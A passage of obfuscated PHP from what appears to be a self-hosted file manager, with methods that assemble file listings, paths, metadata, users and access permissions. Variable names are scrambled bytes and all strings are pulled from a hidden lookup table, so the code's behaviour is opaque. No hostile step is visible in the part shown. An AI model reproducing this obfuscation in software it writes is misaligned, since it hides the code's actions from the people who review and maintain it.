$ˆßÂÀÍ¶); } $this->_listAppendPath($ÒÊ‹ ¬Ë); $this->_listAppendAuth($ÒÊ‹ ¬Ë); $this->_listAppendSourceInfo($ÒÊ‹ ¬Ë, $ˆßÂÀÍ¶); $this->_listAppendUser($ÒÊ‹ ¬Ë); $this->_listFilterInfo($ÒÊ‹ ¬Ë, $é×Òàî£); $this->_listAppendAuthSecret($ÒÊ‹ ¬Ë); } protected function _listSourceCache($Õ¤İŠ²Š) { $Ğ³óºÇñ =& $_SERVER[²Ö÷öõ]; foreach ($Õ¤İŠ²Š as $ŸçÜ²µ½) { self::$cacheSourceInfo[$Ğ³óºÇñ[533] . $ŸçÜ²µ½[$Ğ³óºÇñ[193]]] = $ŸçÜ²µ½; } } protected function _listFilterInfo(&$‰ğöÑò, $¸Ç³Í»Ğ = false) { $ò¨şÄ¹Ş =& $_SERVER[²Ö÷öõ]; foreach ($‰ğöÑò as &$„Ö„íÑì) { $„Ö„íÑì = $this->pathInfoFilter($„Ö„íÑì); self::$cachePathInfo[$ò¨şÄ¹Ş[534] . intval($¸Ç³Í»Ğ) . $ò¨şÄ¹Ş[462] . $„Ö„íÑì[$ò¨şÄ¹Ş[193]]] = $„Ö„íÑì; } unset($„Ö„íÑì); } protected function _listMake(&$Èå‹Ìšğ) { $ù˜¬İšÊ =& $_SERVER[²Ö÷öõ]; $Èå‹Ìšğ[$ù˜¬İšÊ[85]] = array(); $Èå‹Ìšğ[$ù˜¬İšÊ[86]] = array(); foreach ($Èå‹Ìšğ[$ù˜¬İšÊ[445]] as $ü´Â†ÎÎ) { $Ò‚€Ìƒ = $ü´Â†ÎÎ[$ù˜¬İšÊ[485]] == 1 ? $ù˜¬İšÊ[85] : $ù˜¬İšÊ[86]; $Èå‹Ìšğ[$Ò‚€Ìƒ][] = $ü´Â†ÎÎ; } unset($Èå‹Ìšğ[$ù˜¬İšÊ[445]]); } protected function _listAppendMeta(&$½»·Œ—›, $ÈµãİÊ) { $º‡¥ªËŒ =& $_SERVER[²Ö÷öõ]; $äÔùòóÜ = array($º‡¥ªËŒ[491] => array($º‡¥ªËŒ[492], $ÈµãİÊ)); $²¥Ã±Ì³ = Model($º‡¥ªËŒ[535])->field($º‡¥ªËŒ[536])->where($äÔùòóÜ)->select(); if (!$²¥Ã±Ì³) { return; } $¬·È–­« = array($º‡¥ªËŒ[537], $º‡¥ªËŒ[538], $º‡¥ªËŒ[517]); $œ¿Ğ¿Ì = array(); foreach ($²¥Ã±Ì³ as $ƒŸÇ´) { if (!isset($œ¿Ğ¿Ì[$ƒŸÇ´[$º‡¥ªËŒ[193]]])) { $œ¿Ğ¿Ì[$ƒŸÇ´[$º‡¥ªËŒ[193]]] = array(); } if (in_array($ƒŸÇ´[$º‡¥ªËŒ[97]], $¬·È–­«)) { continue; } $œ¿Ğ¿Ì[$ƒŸÇ´[$º‡¥ªËŒ[193]]][$ƒŸÇ´[$º‡¥ªËŒ[97]]] = $ƒŸÇ´[$º‡¥ªËŒ[450]]; } foreach ($½»·Œ—› as &$ŸŒœ‡Å) { $ŸŒœ‡Å[$º‡¥ªËŒ[539]] = !1; if (isset($œ¿Ğ¿Ì[$ŸŒœ‡Å[$º‡¥ªËŒ[193]]])) { $ŸŒœ‡Å[$º‡¥ªËŒ[539]] = $œ¿Ğ¿Ì[$ŸŒœ‡Å[$º‡¥ªËŒ[193]]]; } if ($this->fileIsLock($ŸŒœ‡Å) && $ŸŒœ‡Å[$º‡¥ªËŒ[487]]) { $ù‚ÔÔ‚­ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $ŸŒœ‡Å[$º‡¥ªËŒ[487]][$º‡¥ªËŒ[488]] = AuthModel::authDisable($ŸŒœ‡Å[$º‡¥ªËŒ[487]][$º‡¥ªËŒ[488]], $ù‚ÔÔ‚­); $ŸŒœ‡Å[$º‡¥ªËŒ[487]][$º‡¥ªËŒ[540]][$º‡¥ªËŒ[487]] = $ŸŒœ‡Å[$º‡¥ªËŒ[487]][$º‡¥ªËŒ[488]]; } } unset($ŸŒœ‡Å); } protected function _listAppendFileMeta(&$ª”–£µâ, $ÜöÛº‘ï) { $¿ÔßÌêÎ =& $_SERVER[²Ö÷öõ]; $¯¦¥¥‡æ = array_to_keyvalue($ª”–£µâ, $¿ÔßÌêÎ[12], $¿ÔßÌêÎ[541]); $¯¦¥¥‡æ = array_filter(array_unique($¯¦¥¥‡æ)); if (!$¯¦¥¥‡æ) { return; } $ÀøœñŠô = array($¿ÔßÌêÎ[542] => array($¿ÔßÌêÎ[492], $¯¦¥¥‡æ)); $ùÊïç—Å = $¿ÔßÌêÎ[543]; $˜³âŠ‹ = Model($¿ÔßÌêÎ[544])->field($ùÊïç—Å)->where($ÀøœñŠô)->select(); $˜³âŠ‹ = array_to_keyvalue($˜³âŠ‹, $¿ÔßÌêÎ[541]); $æÓ”‹§ì = Model($¿ÔßÌêÎ[545])->field($¿ÔßÌêÎ[546])->where($ÀøœñŠô)->select(); $æÓ”‹§ì = $æÓ”‹§ì ? $æÓ”‹§ì : array(); $Ú©‘æÕ× = array(); foreach ($æÓ”‹§ì as $î»êÙÙ¯) { if (!isset($Ú©‘æÕ×[$î»êÙÙ¯[$¿ÔßÌêÎ[541]]])) { $Ú©‘æÕ×[$î»êÙÙ¯[$¿ÔßÌêÎ[541]]] = array(); } $Ú©‘æÕ×[$î»êÙÙ¯[$¿ÔßÌêÎ[541]]][$î»êÙÙ¯[$¿ÔßÌêÎ[97]]] = $î»êÙÙ¯[$¿ÔßÌêÎ[450]]; } foreach ($ª”–£µâ as &$ûˆÌ„°) { $¥ˆõƒÂ = $ûˆÌ„°[$¿ÔßÌêÎ[541]]; if (!$¥ˆõƒÂ || !is_array($˜³âŠ‹[$¥ˆõƒÂ])) { continue; } $ì‚åâÇâ = $˜³âŠ‹[$¥ˆõƒÂ]; $ì‚åâÇâ[$¿ÔßÌêÎ[79]] = $ûˆÌ„°[$¿ÔßÌêÎ[79]]; $ì‚åâÇâ[$¿ÔßÌêÎ[32]] = $ûˆÌ„°[$¿ÔßÌêÎ[32]]; if (!$ì‚åâÇâ[$¿ÔßÌêÎ[547]]) { Model($¿ÔßÌêÎ[544])->fileMd5Check($ì‚åâÇâ); } if (!isset(self::$cacheFileInfo[$¿ÔßÌêÎ[548] . $¥ˆõƒÂ])) { self::$cacheFileInfo[$¿ÔßÌêÎ[548] . $¥ˆõƒÂ] = array_merge(array(), $ì‚åâÇâ); } unset($˜³âŠ‹[$¥ˆõƒÂ][$¿ÔßÌêÎ[87]]); $¥Âœ¡ı = isset($Ú©‘æÕ×[$¥ˆõƒÂ]) && is_array($Ú©‘æÕ×[$¥ˆõƒÂ]) ? $Ú©‘æÕ×[$¥ˆõƒÂ] : array(); $ûˆÌ„°[$¿ÔßÌêÎ[170]] = array_merge($¥Âœ¡ı, $˜³âŠ‹[$¥ˆõƒÂ]); if (isset($ûˆÌ„°[$¿ÔßÌêÎ[170]][$¿ÔßÌêÎ[184]])) { $ûˆÌ„°[$¿ÔßÌêÎ[184]] = json_decode($ûˆÌ„°[$¿ÔßÌêÎ[170]][$¿ÔßÌêÎ[184]], !0); unset($ûˆÌ„°[$¿ÔßÌêÎ[170]][$¿ÔßÌêÎ[184]]); } } unset($ûˆÌ„°); } protected function _listAppendSourceInfo(&$æ¡ı‚Í, $§¸ñ¿—’) { $¤Ó¶ôæÒ =& $_SERVER[²Ö÷öõ]; $Œú¨Î¾ = Model($¤Ó¶ôæÒ[549])->listData(); $ãõ®¨› = Model($¤Ó¶ôæÒ[499])->listData(); $­ô‡—èÅ = Model($¤Ó¶ôæÒ[489])->listData(); $¸Ö¨ÛˆĞ = Model($¤Ó¶ôæÒ[550])->listSimple(); $¹ºòŒ‡ = array_to_keyvalue($Œú¨Î¾, $¤Ó¶ôæÒ[475]); $Ï…±íıÈ = array_to_keyvalue_group($ãõ®¨›, $¤Ó¶ôæÒ[87], $¤Ó¶ôæÒ[500]); $ôËöØÂ = array_to_keyvalue($­ô‡—èÅ, $¤Ó¶ôæÒ[87]); $¹Ğ¶‰¤„ = array_to_keyvalue_group($¸Ö¨ÛˆĞ, $¤Ó¶ôæÒ[193]); foreach ($æ¡ı‚Í as &$Û—˜Š¸È) { $Û—˜Š¸È[$¤Ó¶ôæÒ[90]] = array($¤Ó¶ôæÒ[551] => 0, $¤Ó¶ôæÒ[552] => 0, $¤Ó¶ôæÒ[553] => 0); if (isset($ôËöØÂ[$Û—˜Š¸È[$¤Ó¶ôæÒ[193]]])) { $Û—˜Š¸È[$¤Ó¶ôæÒ[90]][$¤Ó¶ôæÒ[554]] = 1; $Û—˜Š¸È[$¤Ó¶ôæÒ[90]][$¤Ó¶ôæÒ[555]] = $ôËöØÂ[$Û—˜Š¸È[$¤Ó¶ôæÒ[193]]][$¤Ó¶ôæÒ[32]]; } if ($Ï…±íıÈ && $¹ºòŒ‡ && isset($Ï…±íıÈ[$Û—˜Š¸È[$¤Ó¶ôæÒ[193]]])) { $Û—˜Š¸È[$¤Ó¶ôæÒ[90]][$¤Ó¶ôæÒ[556]] = array(); foreach ($Ï…±íıÈ[$Û—˜Š¸È[$¤Ó¶ôæÒ[193]]] as $ˆ¤ú³ï¬) { $®’Ú„¥Õ = $¹ºòŒ‡[$ˆ¤ú³ï¬]; $Û—˜Š¸È[$¤Ó¶ôæÒ[90]][$¤Ó¶ôæÒ[556]][] = array($¤Ó¶ôæÒ[557] => $®’Ú„¥Õ[$¤Ó¶ôæÒ[475]], $¤Ó¶ôæÒ[494] => $®’Ú„¥Õ[$¤Ó¶ôæÒ[32]], $¤Ó¶ôæÒ[558] => $®’Ú„¥Õ[$¤Ó¶ôæÒ[559]]); } } if ($¹Ğ¶‰¤„ && isset($¹Ğ¶‰¤„[$Û—˜Š¸È[$¤Ó¶ôæÒ[193]]])) { $Û—˜Š¸È[$¤Ó¶ôæÒ[90]][$¤Ó¶ôæÒ[560]] = array(); foreach ($¹Ğ¶‰¤„[$Û—˜Š¸È[$¤Ó¶ôæÒ[193]]] as $§íì‘›ä) { $óÒ›²şÛ = $¤Ó¶ôæÒ[561]; if ($§íì‘›ä[$¤Ó¶ôæÒ[562]] == $¤Ó¶ôæÒ[91]) { $óÒ›²şÛ .= $¤Ó¶ôæÒ[563]; } $Û—˜Š¸È[$¤Ó¶ôæÒ[90]][$¤Ó¶ôæÒ[560]] = array_field_key($§íì‘›ä, explode($¤Ó¶ôæÒ[50], $óÒ›²şÛ)); } } } unset($Û—˜Š¸È); return $æ¡ı‚Í; } protected function _listAppendChildren(&$µã¯ŞÜÒ, $Ÿîâš„¹) { $˜Ñõ¢†¬ =& $_SERVER[²Ö÷öõ]; $°îÇ«÷ = array(); $šÁŠÌ¹ª = array($˜Ñõ¢†¬[239] => 0, $˜Ñõ¢†¬[240] => 0); foreach ($µã¯ŞÜÒ as &$‚Ñ»İŠ­) { if (!$‚Ñ»İŠ­[$˜Ñõ¢†¬[485]]) { continue; } $°îÇ«÷[] = $‚Ñ»İŠ­[$˜Ñõ¢†¬[193]]; } unset($‚Ñ»İŠ­); if (!$°îÇ«÷) { return; } $àæËƒÙÑ = array($˜Ñõ¢†¬[192] => array($˜Ñõ¢†¬[7], $°îÇ«÷), $˜Ñõ¢†¬[505] => 0); $Î¾ ùÊö = array($˜Ñõ¢†¬[192], $˜Ñõ¢†¬[485], $˜Ñõ¢†¬[564] => $˜Ñõ¢†¬[565]); $¶…şâ¹“ = $this->field($Î¾ ùÊö)->where($àæËƒÙÑ)->group($˜Ñõ¢†¬[566])->select(); $£ÕÏîÅ‡ = array(); foreach ($¶…şâ¹“ as $ÕÕè¼åÛ) { $Ü¥ÄüË´ = $ÕÕè¼åÛ[$˜Ñõ¢†¬[192]]; $• ş¶ôÍ = $ÕÕè¼åÛ[$˜Ñõ¢†¬[485]] == $˜Ñõ¢†¬[91] ? $˜Ñõ¢†¬[240] : $˜Ñõ¢†¬[239]; if (!isset($£ÕÏîÅ‡[$Ü¥ÄüË´])) { $£ÕÏîÅ‡[$Ü¥ÄüË´] = array($˜Ñõ¢†¬[239] => 0, $˜Ñõ¢†¬[240] => 0); } $£ÕÏîÅ‡[$Ü¥ÄüË´][$• ş¶ôÍ] += $ÕÕè¼åÛ[$˜Ñõ¢†¬[565]]; } foreach ($µã¯ŞÜÒ as &$‚Ñ»İŠ­) { if (!$‚Ñ»İŠ­[$˜Ñõ¢†¬[485]]) { continue; } $È×ô‰ç = is_array($£ÕÏîÅ‡[$‚Ñ»İŠ­[$˜Ñõ¢†¬[193]]]) ? $£ÕÏîÅ‡[$‚Ñ»İŠ­[$˜Ñõ¢†¬[193]]] : $šÁŠÌ¹ª; $‚Ñ»İŠ­[$˜Ñõ¢†¬[240]] = $È×ô‰ç[$˜Ñõ¢†¬[240]]; $‚Ñ»İŠ­[$˜Ñõ¢†¬[239]] = $È×ô‰ç[$˜Ñõ¢†¬[239]]; unset($‚Ñ»İŠ­[$˜Ñõ¢†¬[486]]); } unset($‚Ñ»İŠ­); } protected function _listAppendAuth(&$­ª”äÛ¢) { $Š¨öÌâ« =& $_SERVER[²Ö÷öõ]; $¦½³ñ­˜ = array(); foreach ($­ª”äÛ¢ as $¦üÏÑË‡) { if ($¦üÏÑË‡[$Š¨öÌâ«[190]] == self::TYPE_GROUP) { $¦½³ñ­˜[] = $¦üÏÑË‡[$Š¨öÌâ«[193]]; } } if (!$¦½³ñ­˜) { return; } $¦œ÷Î² = array_to_keyvalue($­ª”äÛ¢, $Š¨öÌâ«[193]); $¬Çµ±Ï = Model($Š¨öÌâ«[567])->getSourceList($¦½³ñ­˜, $¦œ÷Î²); $×·’¬è‚ = KodUser::isRoot(); foreach ($­ª”äÛ¢ as $Šôìõ¦ı => &$¦üÏÑË‡) { $¦üÏÑË‡[$Š¨öÌâ«[487]] = $¬Çµ±Ï[$¦üÏÑË‡[$Š¨öÌâ«[193]]]; if (!$¦üÏÑË‡[$Š¨öÌâ«[487]] && $¦üÏÑË‡[$Š¨öÌâ«[190]] == self::TYPE_GROUP) { $¦üÏÑË‡[$Š¨öÌâ«[487]] = Action($Š¨öÌâ«[568])->pathGroupAuthMake($¦üÏÑË‡[$Š¨öÌâ«[569]]); if (!$¦üÏÑË‡[$Š¨öÌâ«[487]] && !$×·’¬è‚) { $¦üÏÑË‡[$Š¨öÌâ«[233]] = !1; $¦üÏÑË‡[$Š¨öÌâ«[232]] = !1; } } if ($¦üÏÑË‡[$Š¨öÌâ«[487]]) { $¦üÏÑË‡[$Š¨öÌâ«[233]] = AuthModel::authCheckEdit($¦üÏÑË‡[$Š¨öÌâ«[487]][$Š¨öÌâ«[488]]); $¦üÏÑË‡[$Š¨öÌâ«[232]] = AuthModel::authCheckView($¦üÏÑË‡[$Š¨öÌâ«[487]][$Š¨öÌâ«[488]]); } $this->groupPathDisplay($¦üÏÑË‡); } unset($¦üÏÑË‡); } public function _listAppendAuthSecret(&$¾õ’¨“û) { $’ÜçÕ =& $_SERVER[²Ö÷öõ]; if (Model($’ÜçÕ[508])->get($’ÜçÕ[570]) != $’ÜçÕ[91]) { return; } static $æ«Šì½ = false; if (!$æ«Šì½) { $ì”Í·ı = Model($’ÜçÕ[571]); $°£ÒÎ÷ = Model($’ÜçÕ[572]); $æ«Šì½ = $°£ÒÎ÷->listData(); $æ«Šì½ = array_to_keyvalue($æ«Šì½, $’ÜçÕ[193]); $óò³­ƒ = json_decode(Model($’ÜçÕ[508])->get($’ÜçÕ[573]), !0); $óò³­ƒ = array_to_keyvalue($óò³­ƒ, $’ÜçÕ[475]); foreach ($æ«Šì½ as $ÌÜ©‘­õ => $å†øâÌ‚) { $Ìëê¤§ = $óò³­ƒ[$å†øâÌ‚[$’ÜçÕ[574]]]; if (!$Ìëê¤§) { $°£ÒÎ÷->remove($å†øâÌ‚[$’ÜçÕ[475]]); unset($æ«Šì½[$ÌÜ©‘­õ]); continue; } $ á†ãá‘ = $ì”Í·ı->listData($Ìëê¤§[$’ÜçÕ[487]]); if (!$ á†ãá‘) { $°£ÒÎ÷->remove($å†øâÌ‚[$’ÜçÕ[475]]); unset($æ«Šì½[$ÌÜ©‘­õ]); continue; } $å†øâÌ‚[$’ÜçÕ[487]] = $ á†ãá‘; $å†øâÌ‚[$’ÜçÕ[575]] = $Ìëê¤§; $å†øâÌ‚[$’ÜçÕ[576]] = Model($’ÜçÕ[577])->getInfoSimpleOuter($å†øâÌ‚[$’ÜçÕ[527]]); $æ«Šì½[$ÌÜ©‘­õ] = $å†øâÌ‚; } } $ŞšÀ—Ù™ = USER_ID; $êíí÷ì³ = array(); $Ÿ‘ÑË¼ú = $this->_listAppendPath($êíí÷ì³, !0); foreach ($¾õ’¨“û as $ÌÜ©‘­õ => &$å†øâÌ‚) { if (!is_array($å†øâÌ‚[$’ÜçÕ[487]])) { continue; } if ($å†øâÌ‚[$’ÜçÕ[190]] != $’ÜçÕ[578]) { continue; } if (isset($æ«Šì½[$å†øâÌ‚[$’ÜçÕ[193]]])) { $òî¡ƒ„à = $æ«Šì½[$å†øâÌ‚[$’ÜçÕ[193]]]; if (!is_array($å†øâÌ‚[$’ÜçÕ[539]])) { $å†øâÌ‚[$’ÜçÕ[539]] = array(); } $å†øâÌ‚[$’ÜçÕ[539]][$’ÜçÕ[579]] = $òî¡ƒ„à[$’ÜçÕ[574]]; $å†øâÌ‚[$’ÜçÕ[487]][$’ÜçÕ[580]] = $òî¡ƒ„à; $å†øâÌ‚[$’ÜçÕ[487]][$’ÜçÕ[581]] = $å†øâÌ‚[$’ÜçÕ[582]]; $å†øâÌ‚[$’ÜçÕ[487]][$’ÜçÕ[583]] = $’ÜçÕ[91]; if ($òî¡ƒ„à[$’ÜçÕ[527]] != $ŞšÀ—Ù™) { $å†øâÌ‚[$’ÜçÕ[487]][$’ÜçÕ[488]] = $å†øâÌ‚[$’ÜçÕ[487]][$’ÜçÕ[488]] & $òî¡ƒ„à[$’ÜçÕ[487]][$’ÜçÕ[487]]; } continue; } $ËşÜØëÔ = $this->parentLevelArray($å†øâÌ‚[$’ÜçÕ[584]]); $¸Û¤ªÇÀ = array_reverse($ËşÜØëÔ); foreach ($¸Û¤ªÇÀ as $»ö·ÄÕø => $’„ƒÏäñ) { if (!isset($æ«Šì½[$’„ƒÏäñ])) { continue; } $òî¡ƒ„à = $æ«Šì½[$’„ƒÏäñ]; $å†øâÌ‚[$’ÜçÕ[487]][$’ÜçÕ[580]] = $òî¡ƒ„à; if ($òî¡ƒ„à[$’ÜçÕ[527]] != $ŞšÀ—Ù™) { $å†øâÌ‚[$’ÜçÕ[487]][$’ÜçÕ[488]] = $å†øâÌ‚[$’ÜçÕ[487]][$’ÜçÕ[488]] & $òî¡ƒ„à[$’ÜçÕ[487]][$’ÜçÕ[487]]; } $å¨Â“ = $’ÜçÕ[12]; $Ãº”ĞÆ» = count($ËşÜØëÔ) - $»ö·ÄÕø; for ($ÔÍóŠ‘ë = 0; $ÔÍóŠ‘ë < $Ãº”ĞÆ»; $ÔÍóŠ‘ë++) { if (!isset($Ÿ‘ÑË¼ú[$ËşÜØëÔ[$ÔÍóŠ‘ë]])) { $å¨Â“ = $’ÜçÕ[12]; break; } $å¨Â“ = $å¨Â“ . rtrim($Ÿ‘ÑË¼ú[$ËşÜØëÔ[$ÔÍóŠ‘ë]], $’ÜçÕ[8]) . $’ÜçÕ[8]; } $å†øâÌ‚[$’ÜçÕ[487]][$’ÜçÕ[581]] = rtrim($å¨Â“, $’ÜçÕ[8]) . $’ÜçÕ[8]; break; } } unset($å†øâÌ‚); } public function groupPathDisplay(&$ãçôÌ¿­) { $³ÒÅÁÙ† =& $_SERVER[²Ö÷öõ]; if ($ãçôÌ¿­[$³ÒÅÁÙ†[190]] != self::TYPE_GROUP) { return; } $üÌ•®Îü = Model($³ÒÅÁÙ†[585])->getInfo($ãçôÌ¿­[$³ÒÅÁÙ†[569]]); $‹Â¢È¨ = $this->parentLevelArray($üÌ•®Îü[$³ÒÅÁÙ†[584]]); $ûñèº†ë = $³ÒÅÁÙ†[12]; foreach ($‹Â¢È¨ as $¥ÆÁË½´) { $åÖƒ†ØÑ = Model($³ÒÅÁÙ†[585])->getInfo($¥ÆÁË½´); $ûñèº†ë .= $åÖƒ†ØÑ[$³ÒÅÁÙ†[90]][$³ÒÅÁÙ†[193]] . $³ÒÅÁÙ†[50]; } $ãçôÌ¿­[$³ÒÅÁÙ†[586]] = $üÌ•®Îü[$³ÒÅÁÙ†[192]]; $ãçôÌ¿­[$³ÒÅÁÙ†[587]] = $üÌ•®Îü[$³ÒÅÁÙ†[584]]; $ãçôÌ¿­[$³ÒÅÁÙ†[588]] = $üÌ•®Îü[$³ÒÅÁÙ†[589]]; $ãçôÌ¿­[$³ÒÅÁÙ†[590]] = $ûñèº†ë . $üÌ•®Îü[$³ÒÅÁÙ†[90]][$³ÒÅÁÙ†[193]]; } protected function _listAppendPath(&$¤ğ–ªßº, $÷ì¯¹À¹ = false) { $Ë¯±ó­› =& $_SERVER[²Ö÷öõ]; static $ã»¯›ñ— = array(); $¿¿±‚²€ = array(); $•Î•ƒÒ¢ = array(); if ($÷ì¯¹À¹) { return $ã»¯›ñ—; } foreach ($¤ğ–ªßº as &$³š·š¦¯) { $ğùîÇ§Í = $³š·š¦¯[$Ë¯±ó­›[193]]; if ($³š·š¦¯[$Ë¯±ó­›[485]] == $Ë¯±ó­›[91] && $³š·š¦¯[$Ë¯±ó­›[192]] != 0) { $ã»¯›ñ—[$ğùîÇ§Í] = $³š·š¦¯[$Ë¯±ó­›[32]]; } if ($³š·š¦¯[$Ë¯±ó­›[485]] == $Ë¯±ó­›[91] && $³š·š¦¯[$Ë¯±ó­›[192]] == 0) { $ã»¯›ñ—[$ğùîÇ§Í] = $this->_listAppendPathRoot($³š·š¦¯, array()); } if (isset($•Î•ƒÒ¢[$³š·š¦¯[$Ë¯±ó­›[584]]])) { continue; } $•Î•ƒÒ¢[$³š·š¦¯[$Ë¯±ó­›[584]]] = !0; $ãØ²ğÏŞ = $this->parentLevelArray($³š·š¦¯[$Ë¯±ó­›[584]]); foreach ($ãØ²ğÏŞ as $á¬Â˜ê¨ => $ÅÔ¬úº) { if (isset($ã»¯›ñ—[$ÅÔ¬úº])) { continue; } if ($á¬Â˜ê¨ == 0) { $ã»¯›ñ—[$ÅÔ¬úº] = $this->_listAppendPathRoot($³š·š¦¯, $ãØ²ğÏŞ); } if ($á¬Â˜ê¨ != 0) { $¿¿±‚²€[] = $ÅÔ¬úº; } } } unset($³š·š¦¯); $¿¿±‚²€ = array_unique($¿¿±‚²€); if (count($¿¿±‚²€) > 0) { $¬§Æö¬¤ = array($Ë¯±ó­›[491] => array($Ë¯±ó­›[492], $¿¿±‚²€)); if (count($¿¿±‚²€) == 1) { $¡ğâƒ¯½ = $this->sourceInfo($¿¿±‚²€[0]); $â¾üÀ• = is_array($¡ğâƒ¯½) ? array($¡ğâƒ¯½) : !1; } else { $â¾üÀ• = $this->field($Ë¯±ó­›[591])->where($¬§Æö¬¤)->select(); } if (!$â¾üÀ•) { $â¾üÀ• = array(); } foreach ($â¾üÀ• as $«œ¦Ñ·£) { $ã»¯›ñ—[$«œ¦Ñ·£[$Ë¯±ó­›[193]]] = $«œ¦Ñ·£[$Ë¯±ó­›[32]]; } } $Š¨¼õÒ‚ = KodIO::sourceID(IO_PATH_SYSTEM_RECYCLE); $˜¶ÕÑğ¿ = array(); foreach ($¤ğ–ªßº as &$³š·š¦¯) { $şšÇø«ª = $³š·š¦¯[$Ë¯±ó­›[584]]; $»¸•¢“Æ = $Ë¯±ó­›[12]; if (isset($˜¶ÕÑğ¿[$şšÇø«ª])) { $»¸•¢“Æ = $˜¶ÕÑğ¿[$şšÇø«ª]; } else { $ãØ²ğÏŞ = $this->parentLevelArray($³š·š¦¯[$Ë¯±ó­›[584]]); foreach ($ãØ²ğÏŞ as $á¬Â˜ê¨ => $ÅÔ¬úº) { if (isset($ã»¯›ñ—[$ÅÔ¬úº])) { $»¸•¢“Æ .= $ã»¯›ñ—[$ÅÔ¬úº] . $Ë¯±ó­›[8]; } } $˜¶ÕÑğ¿[$şšÇø«ª] = $»¸•¢“Æ; } $»¸•¢“Æ .= $³š·š¦¯[$Ë¯±ó­›[32]]; if ($³š·š¦¯[$Ë¯±ó­›[485]] == $Ë¯±ó­›[91]) { $»¸•¢“Æ .= $Ë¯±ó­›[8]; } $³š·š¦¯[$Ë¯±ó­›[582]] = str_replace($Ë¯±ó­›[592], $Ë¯±ó­›[8], $»¸•¢“Æ); if ($³š·š¦¯[$Ë¯±ó­›[192]] == $Ë¯±ó­›[228]) { $³š·š¦¯[$Ë¯±ó­›[32]] = trim($ã»¯›ñ—[$³š·š¦¯[$Ë¯±ó­›[193]]], $Ë¯±ó­›[8]); $³š·š¦¯[$Ë¯±ó­›[582]] = $³š·š¦¯[$Ë¯±ó­›[32]] . $Ë¯±ó­›[8]; } if (intval($³š·š¦¯[$Ë¯±ó­›[190]]) == self::TYPE_SYSTEM) { $this->_listAppendPathRecycle($³š·š¦¯, $ãØ²ğÏŞ, $Š¨¼õÒ‚); } } unset($³š·š¦¯); return $¤ğ–ªßº; } private function _listAppendPathRecycle(&$Ç§Û¯·, $˜ƒß¢çô, $É©šŸæ”) { $úÈ¤‰–¯ =& $_SERVER[²Ö÷öõ]; if (!in_array($É©šŸæ”, $˜ƒß¢çô) && $Ç§Û¯·[$úÈ¤‰–¯[193]] != $É©šŸæ”) { return; } $øÎÔúĞß = explode($úÈ¤‰–¯[8], trim($Ç§Û¯·[$úÈ¤‰–¯[582]], $úÈ¤‰–¯[8])); $”‡İÑŠ² = implode($úÈ¤‰–¯[8], array_slice($øÎÔúĞß, 2)); $Ç§Û¯·[$úÈ¤‰–¯[582]] = $úÈ¤‰–¯[8] . LNG($úÈ¤‰–¯[593]) . $úÈ¤‰–¯[8] . ltrim($”‡İÑŠ², $úÈ¤‰–¯[8]); $Ç§Û¯·[$úÈ¤‰–¯[584]] = $úÈ¤‰–¯[594] . implode($úÈ¤‰–¯[50], array_slice($˜ƒß¢çô, 1)) . $úÈ¤‰–¯[50]; if ($Ç§Û¯·[$úÈ¤‰–¯[193]] == $É©šŸæ”) { $Ç§Û¯·[$úÈ¤‰–¯[584]] = $úÈ¤‰–¯[594]; $Ç§Û¯·[$úÈ¤‰–¯[192]] = $úÈ¤‰–¯[228]; $Ç§Û¯·[$úÈ¤‰–¯[32]] = LNG($úÈ¤‰–¯[593]); } $Ç§Û¯·[$úÈ¤‰–¯[595]] = $úÈ¤‰–¯[596]; } protected function _listAppendPathRoot(&$†òº°ë, $âÅÏÑê) { $ôÔ¬•à =& $_SERVER[²Ö÷öõ]; static $Æ´î™¨û = false; $ĞÈ·øÔ = $ôÔ¬•à[12]; if ($†òº°ë[$ôÔ¬•à[190]] == self::TYPE_USER) { if ($†òº°ë[$ôÔ¬•à[569]] == USER_ID) { $ĞÈ·øÔ = LNG($ôÔ¬•à[597]); if ($Æ´î™¨û === !1) { $Æ‹¹ÜÍÃ = Model($ôÔ¬•à[598])->getInfoFull(USER_ID); $Æ´î™¨û = _get($Æ‹¹ÜÍÃ, $ôÔ¬•à[599], $ôÔ¬•à[12]); } if ($âÅÏÑê && $âÅÏÑê[0] == $Æ´î™¨û || !$âÅÏÑê && $†òº°ë[$ôÔ¬•à[193]] == $Æ´î™¨û) { $ĞÈ·øÔ = LNG($ôÔ¬•à[600]); $†òº°ë[$ôÔ¬•à[601]] = $ôÔ¬•à[602]; } if (!$âÅÏÑê) { $†òº°ë[$ôÔ¬•à[32]] = $ĞÈ·øÔ; } } else { $†òº°ë[$ôÔ¬•à[603]] = Model($ôÔ¬•à[577])->getInfoSimpleOuter($†òº°ë[$ôÔ¬•à[569]]); $ĞÈ·øÔ = LNG($ôÔ¬•à[604]) . $ôÔ¬•à[176] . $†òº°ë[$ôÔ¬•à[603]][$ôÔ¬•à[32]] . $ôÔ¬•à[178]; } } else { if ($†òº°ë[$ôÔ¬•à[190]] == self::TYPE_GROUP) { $Ö«íú = Model($ôÔ¬•à[585])->getInfoSimple($†òº°ë[$ôÔ¬•à[569]]); $ĞÈ·øÔ = $Ö«íú[$ôÔ¬•à[32]]; } else { if ($†òº°ë[$ôÔ¬•à[190]] == self::TYPE_SYSTEM) { $ĞÈ·øÔ = $ôÔ¬•à[605]; } } } $ĞÈ·øÔ = $ĞÈ·øÔ ? $ôÔ¬•à[8] . $ĞÈ·øÔ . $ôÔ¬•à[8] : $ôÔ¬•à[8]; return $ĞÈ·øÔ; } protected function _listAppendUser(&$Å»¡ÓŸî) { $éÆÈ¸»ı =& $_SERVER[²Ö÷öõ]; $Æ³Å‹àó = array_to_keyvalue($Å»¡ÓŸî, $éÆÈ¸»ı[12], $éÆÈ¸»ı[527]); $Âîúö¢ = array_to_keyvalue($Å»¡ÓŸî, $éÆÈ¸»ı[12], $éÆÈ¸»ı[529]); $³®„ŠÒÂ = array_merge($Æ³Å‹àó, $Âîúö¢); $—¤­ĞÈà = Model($éÆÈ¸»ı[598])->userListInfo($³®„ŠÒÂ); foreach ($Å»¡ÓŸî as &$¿œ‡ä¤) { $Ö´„ÉÒğ = $¿œ‡ä¤[$éÆÈ¸»ı[527]]; $¿œ‡ä¤[$éÆÈ¸»ı[527]] = $—¤­ĞÈà[$Ö´„ÉÒğ] ? $—¤­ĞÈà[$Ö´„ÉÒğ] : !1; $Ö´„ÉÒğ = $¿œ‡ä¤[$éÆÈ¸»ı[529]]; $¿œ‡ä¤[$éÆÈ¸»ı[529]] = $—¤­ĞÈà[$Ö´„ÉÒğ] ? $—¤­ĞÈà[$Ö´„ÉÒğ] : !1; if (_get($¿œ‡ä¤, 